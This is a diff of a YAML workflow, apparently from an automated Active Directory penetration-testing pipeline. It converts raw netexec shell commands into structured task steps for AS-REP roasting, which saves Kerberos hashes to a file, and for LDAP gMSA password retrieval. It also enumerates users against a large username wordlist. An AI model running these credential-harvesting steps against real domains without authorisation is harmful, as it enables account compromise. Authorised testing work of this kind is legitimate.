@@ -148,9 +148,15 @@ jobs:
           domain: "{{ inputs.domain }}"
           users: /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
         continue-on-error: true
-      - name: asrep-roast
-        run: |
-          netexec ldap {{ inputs.target }} -u {{ inputs.username if inputs.username else '""' }} -p {{ inputs.password if inputs.password else '""' }} --asreproast /tmp/asrep-hashes.txt 2>/dev/null | tee /tmp/asrep-output.txt
+      - task: netexec
+        timeout: 15
+        name: asrep-roast
+        with:
+          target: "{{ inputs.target }}"
+          protocol: ldap
+          username: "{{ inputs.username if inputs.username else '\"\"' }}"
+          password: "{{ inputs.password if inputs.password else '\"\"' }}"
+          asreproast: /tmp/asrep-hashes.txt
         continue-on-error: true
       - name: collect-kerberos
         script: |
@@ -197,13 +203,16 @@ jobs:
           users: true
         if: "{{ inputs.username }}"
         continue-on-error: true
-      - name: nxc-ldap-gmsa
-        run: |
-          {% if inputs.username %}
-          netexec ldap {{ inputs.target }} -u {{ inputs.username }} -p {{ inputs.password }} --gmsa 2>/dev/null | tee /tmp/ldap-gmsa.txt
-          {% else %}
-          echo "Skipping LDAP gMSA enum (no credentials provided)"
-          {% endif %}
+      - task: netexec
+        timeout: 15
+        name: nxc-ldap-gmsa
+        if: "{{ inputs.username }}"
+        with:
+          target: "{{ inputs.target }}"
+          protocol: ldap
+          username: "{{ inputs.username }}"
+          password: "{{ inputs.password }}"
+          gmsa: true
         continue-on-error: true
       - name: collect-ldap
         script: |
